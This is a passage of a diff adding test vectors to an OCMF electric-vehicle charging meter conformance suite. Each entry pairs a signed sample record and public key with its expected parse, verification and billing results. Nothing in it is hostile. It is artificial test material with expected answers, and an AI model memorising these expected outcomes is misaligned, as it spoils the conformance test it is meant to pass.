+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-flag-PLMN_SMS",
+   "group": "table",
+   "description": "IF contains PLMN_SMS [OCMF Tab. 13-16]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"PLMN_SMS\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402203451526A29AFE5BCD3BD045147B214B096DFABA51E18B19EB74FD95F34721F010220634F454912CA8373BE865AE7E513F82A44D8254B3D5EBF2CDCF3EC81F43014C8\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/charge-point-EVSEID",
+   "group": "table",
+   "description": "CT = EVSEID, with a CI of the shape that row prescribes [OCMF Tab. 18]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"CT\":\"EVSEID\",\"CI\":\"DE*ABC*E001\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100BD72982DC8A05E809596B9BB845B29C104C8604F43F8D774DF10FA6ED15F2918022064E7E7D8E7CC1F4E4DE3D55447B4C49FBBA1AC84BA116C156372170562448372\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/charge-point-CBIDC",
+   "group": "table",
+   "description": "CT = CBIDC, with a CI of the shape that row prescribes [OCMF Tab. 18]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"CT\":\"CBIDC\",\"CI\":\"STEVE_01 1\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402203EBDD0AB1B1AFDEFE5D2C00055521508106020DFF790ABE8A396A8D4D989E05D02205B68FF269228468DC3FCB8065DBC457AB234242E39AD0A6E0D09A6F8413D9A7D\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/obis-B0",
+   "group": "table",
+   "description": "RI = 01-00:B0.08.00*FF [OCMF Tab. 25]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B0.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B0.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022054983CF146E15AFF92DE0FA19486EEB2FA949A92A9352AF0545C5D1622F5EFB6022025D9B10935AC252265D235C8A46EFB31C7C11D1B4904408DD360748C601E60E4\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/obis-B1",
+   "group": "table",
+   "description": "RI = 01-00:B1.08.00*FF [OCMF Tab. 25]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100C4A27B8563AD085C203E33309DD0E90CF9F5452C3A94E21E8FD432BF24A55AD30220681DD1A48492E1E7CA6BB15F028733CCE60CC0AC056EDF65808512475EB8E201\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/obis-B2",
+   "group": "table",
+   "description": "RI = 01-00:B2.08.00*FF [OCMF Tab. 25]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B2.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B2.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022058257B4D0E8EFD8C76E4481B49E9D69F7E532360AEE825A4DEBFBEFD5A400E7102201EBD90E46688F3B7343C64060FD23052ADD1932FD3F1FE6608D23FD000B9C369\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/obis-B3",
+   "group": "table",
+   "description": "RI = 01-00:B3.08.00*FF [OCMF Tab. 25]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B3.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B3.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100CBE6BC2F84F9B46DCCFA26C5C5DBA4D1486D545E519F4900C4153AE9FC40AA7202202BF07E54F5574F55B13D74CA5E8E458CF4DF2602999E50B6D1E12360AAE2DC6F\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/obis-C0",
+   "group": "table",
+   "description": "RI = 01-00:C0.08.00*FF [OCMF Tab. 25]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:C0.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:C0.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022041F3B9977D8914F99C0F83424598FB1A0060AE43CEA9B013F2628A3B22118208022041B09E1BA6CB485C788B25F8BC0D16A7DD48537BB2D94B5470BE5CA850051453\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/obis-C1",
+   "group": "table",
+   "description": "RI = 01-00:C1.08.00*FF [OCMF Tab. 25]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:C1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:C1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100C9E36C1B2210D9F6A7AB6D201E4A6C7DB7DD962A75380176ECC4DC25CEAC1CE50220751FBAB039536460BA5FA889BBE7A234CEAC9DF34E25CD53828D1238116CBFDD\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/obis-C2",
+   "group": "table",
+   "description": "RI = 01-00:C2.08.00*FF [OCMF Tab. 25]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:C2.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:C2.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30440220036D291A9AED3533DE7A3F12895766ACCFF1AD2865E428CE243F5C3AA683E2A602201D0598F33BE05DE9F8E18F163E16EF62CA9CF1EE9B4A31A9D6F06597E1CDFCD7\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/obis-C3",
+   "group": "table",
+   "description": "RI = 01-00:C3.08.00*FF [OCMF Tab. 25]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:C3.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:C3.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30440220751CE31B593662B11A0F4764EF8040C6D2C96B017A5A6BBFA95D69D89D40169C02201F45284AD611F2EE5443C840751995F8607968F11CE02358F8575D6571A96AC0\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/error-flags-E",
+   "group": "table",
+   "description": "EF = E [OCMF Tab. 7]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"E\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402200DCB4ABE87B68B5E53F60DA4C256840C34791F92683063BDBEE242A245AA2E5B022030D3D517E7A138227E8FDCAAE692C337F74BCA6CED68F713CB2B7EE32F3CBA92\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 0 }
+  },
+  {
+   "id": "table/error-flags-t",
+   "group": "table",
+   "description": "EF = t [OCMF Tab. 7]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"t\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402207844F8373F63DAF27BA5300E70DF7FDF48D8AB9DAA0E2E3800B3EFB092D9042E02201113BB7F0395DF7B98A6299C05FB9960DB23107475806FE74AAD660D7E035A07\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 0 }
+  },
+  {
+   "id": "table/error-flags-Et",
+   "group": "table",
+   "description": "EF = Et [OCMF Tab. 7]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"Et\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022047B08031591E641C77DE05EE86ACE3A92C8B866B400017B02F1DCF4359E30C3002203A8F021183B98D03B36947B419EC1DFD09DCB8869966DBA860509A92F544C918\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 0 }
+  },
+  {
+   "id": "table/charge-controller-firmware",
+   "group": "table",
+   "description": "CF, the EVSE charge-controller firmware version [OCMF Tab. 5]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"CF\":\"SMK-2.4.1\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022100EE97DF832421AEC1B3ECADB16EA41F45E09877012C17AF233A22C7815431CC96021F7A9F2CE5AE85D1C5D1136B45C368B99804093472DDDF8C26263F286EA97C09\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/cumulated-loss",
+   "group": "table",
+   "description": "CL, cable loss withdrawn from the reading [OCMF Tab. 7]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"CL\":0.5,\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30440220507281B923DB5062C8C90E0A0FFEBFBA7A712FC994B2568D050D694C8690842F02207365927C6D413597CF825221595E78BE4F3AC30F94CA29E21DD0B07D85A2D0F5\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/pagination-fiscal",
+   "group": "table",
+   "description": "PG in the fiscal context (F), which no corpus record exercises [OCMF Tab. 2]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"F9\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100B1C122697447E3D928443E77680F8F2A9367AA4EBE1DF6E877E6C2EF3DD7035B022068037558F4657349A098212E2F44D63D1521C008C3B66114C2FC3B0383E9A3DD\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/loss-compensation",
+   "group": "table",
+   "description": "LC with all four fields [OCMF Tab. 24]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"LC\":{\"LN\":\"cable_name\",\"LI\":1,\"LR\":2,\"LU\":\"mOhm\"},\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022064A156A33F3CACD84CE4DE2DF72ACEEB7AB76E9437F190D181E147C6C035EFA002205BA597C59F09035817AECC799E6DC3B518BEB4F5E78BB6AC7E3FBDD39A3063E5\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/escaped-table-value",
+   "group": "table",
+   "description": "RU written as \\u006bWh, a lawful spelling of kWh [OCMF Tab. 20]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"\\u006bWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30440220631798F7DD0863B2D0314F1E4416E708214FD72AC8C045339D6D1EADCCE1B0D402207C76B0480D45373EB6BF17627ED2F5C6359DBE8836E1346BC209352240F2E281\"}",
